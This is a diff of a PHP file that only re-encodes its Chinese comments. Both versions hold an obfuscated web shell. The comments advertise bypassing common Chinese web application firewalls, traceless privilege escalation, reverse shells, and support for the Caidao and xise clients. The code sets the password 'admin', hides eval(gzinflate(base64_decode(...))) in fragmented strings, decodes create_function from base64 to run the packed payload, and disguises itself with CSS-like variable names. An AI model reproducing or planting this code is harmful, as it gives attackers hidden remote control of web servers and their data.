@@ -1,8 +1,8 @@
 <?php
 /**
- * ±¾´Î¸üÐÂ£ºÌå»ýÓÅ»¯¡¢Ñ¹ËõÓÅ»¯¡¢ÃüÁîÓÅ»¯¡¢·´µ¯ÓÅ»¯¡¢ÎÄ¼þ¹ÜÀíÓÅ»¯¡¢¹ÒÂíÇåÂíÓÅ»¯µÈ´óÁ¿¹¦ÄÜÏ¸½ÚÓÅ»¯
- * ¹¦ÄÜÌØÉ«£ºPHP¸ß°æ±¾µÍ°æ±¾¶¼ÄÜÖ´ÐÐ£¬ÎÄ¼þ¶ÌÐ¡¾«º·£¬·½±ãÉÏ´«£¬¹¦ÄÜÇ¿´ó£¬ÌáÈ¨ÎÞºÛ¼££¬ÎÞÊÓwaf£¬¹ý°²È«¹·¡¢ÔÆËø¡¢360¡¢°¢ÀïÔÆ¡¢»¤ÎÀÉñµÈÖ÷Á÷waf¡£Í¬Ê±Ö§³Ö²Ëµ¶¡¢xiseÁ¬½Ó¡£
+ * æœ¬æ¬¡æ›´æ–°ï¼šä½“ç§¯ä¼˜åŒ–ã€åŽ‹ç¼©ä¼˜åŒ–ã€å‘½ä»¤ä¼˜åŒ–ã€åå¼¹ä¼˜åŒ–ã€æ–‡ä»¶ç®¡ç†ä¼˜åŒ–ã€æŒ‚é©¬æ¸…é©¬ä¼˜åŒ–ç­‰å¤§é‡åŠŸèƒ½ç»†èŠ‚ä¼˜åŒ–
+ * åŠŸèƒ½ç‰¹è‰²ï¼šPHPé«˜ç‰ˆæœ¬ä½Žç‰ˆæœ¬éƒ½èƒ½æ‰§è¡Œï¼Œæ–‡ä»¶çŸ­å°ç²¾æ‚ï¼Œæ–¹ä¾¿ä¸Šä¼ ï¼ŒåŠŸèƒ½å¼ºå¤§ï¼Œææƒæ— ç—•è¿¹ï¼Œæ— è§†wafï¼Œè¿‡å®‰å…¨ç‹—ã€äº‘é”ã€360ã€é˜¿é‡Œäº‘ã€æŠ¤å«ç¥žç­‰ä¸»æµwafã€‚åŒæ—¶æ”¯æŒèœåˆ€ã€xiseè¿žæŽ¥ã€‚
  */
 
-$password='admin';  //µÇÂ¼ÃÜÂë
+$password='admin';  //ç™»å½•å¯†ç 
 $html='$password'.'='."'".$password."';".'@e#html'.''.'v'."".''.''."".''.''.''.'a'.''.'l('.'g'.''."".''.''.'z'.'i'.''.''.'n'.'f'.'l'.''.''."".'a'.'t'.'e(b'.'as'.''.''.''."".''.'e'.'6'.''."".''."".""."".''.'4_'.'d'.'e'.'c'.''.''.''."".''."".'o'.'d'.'e'.'('."'lVZhb5tIEP0eKf9hg6ICEufgXBy1sSI1TTHJKcY5jJsmbYTwspitMUt3SWiT+r/fLLZjjN3UxxfE7sybN29nZtndIZwz7nOSMZ7TdKSZent3RxAhKEt9kQc81+QKjZC2R4Ugubbv961+/7LnfFGyOAsyqtzrOnre3UHw7GN0ilS1Pf96EIQHI5LmcrXLnmiSBAdHDRNpmE2yIKfDhLRRt39poeOG2UY3NA1ZIZDjoVbjUF/i8AQQhoEgx0d+SDALibb6pdwO4n7Xdqzh33fdrvnP460Z2uFhx3M+f6DDT9mhd5G5odn66Ny04k/N8bvz0empouuVCA4p6jGUq6cP10M7iYOmexl8dv7t2XHRtTtjbI9a2O4UgTfg+Ntdcns4Lm69uBXcZPndU/JIbKfo3Tg8nMSTq0JGmgeSQkYPKc6lvuQHFbnQ1EgwPGYZSdWlkiWrhKZjSDwLuCA+UNQkzwVUafH9gfCfYFKaflFB01i9rxrETEj1Rc5zlrCCcG1uKjfU+xWwKAPLFzJa6Wugt6aB9qFOUjZ7A5SBmmbVU2YF3ivkS0T2IIMrtuWhg+cZ2Sm68Lzrg2bD/Mq/pkp7g0cDXC4g9gl6LjlMX7UcQJH9dSar7AT9/xp7FfqcpSkpz+oEnSdMEGm9ySMqOM2J1MAovfU6Ik1jEoSEgxrN+h5maQ7shVSqDlzENCHQexFhUSnxmsaLQiHy7EYE6qlkcWS+O66zeDmqJZtTZG5EXCXWmBUY2YA3/VOIN2+QNucH+YF06NcvVFmQauq/51ARzvxz+NpnhOWhlbqtiS6bZpFgZXOOMF226x4UfMZAVmws5oQus1prYwybPk1prr6yT34QXG9zHAOZF2+tyrVchbHLMpi8ODbQ+cC96l17PrxmdLay9i67Vm/gQd+2trJ3LW/gOp575vQ7lmsgzx1Y29HqW+6ZbTmeUZn+K0MGL3KVSkjnNdz5oS13tjgMEM6H4tfUIIEpJ2elH22aqDmZZLLR3kfQV2vjtIwAFvlPbWap6xvK5j2dZIm8HlTVmCOugVRoKiFJPlJ+loYdiKlshpR0ZAL+oiRXuFUE2JT/HjRSFCSC1MpqNvfl7Z4EeJYt2AMjBZzxyqmsX+rgPHqiaZQEef2yBd8Ks+ns92CLvwPyGCQbLQBs+h8=')));";$css=base64_decode("Q3JlYXRlX0Z1bmN0aW9u");$style=$css('',preg_replace("/#html/","",$html));$style();/*));.'<linkrel="stylesheet"href="$#css"/>';*/
